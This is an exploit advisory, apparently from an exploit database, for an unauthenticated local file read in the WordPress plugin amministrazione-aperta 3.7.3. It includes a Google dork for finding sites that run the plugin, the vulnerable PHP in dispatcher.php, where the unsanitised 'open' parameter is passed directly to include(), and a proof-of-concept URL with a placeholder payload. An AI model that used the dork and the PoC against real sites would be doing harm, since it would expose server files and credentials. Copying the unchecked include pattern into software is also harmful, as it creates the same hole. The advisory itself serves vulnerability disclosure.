# Exploit Title: WordPress Plugin amministrazione-aperta 3.7.3 - Local File Read - Unauthenticated<
Google Dork: inurl:/wp-content/plugins/amministrazione-aperta/<br>
Date: 23-03-2022<br>
Exploit Author: Hassan Khan Yusufzai - Splint3r7<br>
Vendor Homepage: https://wordpress.org/plugins/amministrazione-aperta/<br>
Version: 3.7.3<br>
Tested on: Firefox<br>
<br>
Vulnerable File: dispatcher.php<br>
<br>
Vulnerable Code:<br>

```
if ( isset($_GET['open']) ) {
    include(ABSPATH . 'wp-content/plugins/'.$_GET['open']);
} else {
    echo '
        <div id="welcome-panel" class="welcome-panel"
style="padding-bottom: 20px;">
                <div class="welcome-panel-column-container">';

    include_once( ABSPATH . WPINC . '/feed.php' );
```

Proof of Concept:<br>

localhost/wp-content/plugins/amministrazione-aperta/wpgov/dispatcher.php?open=[LFI]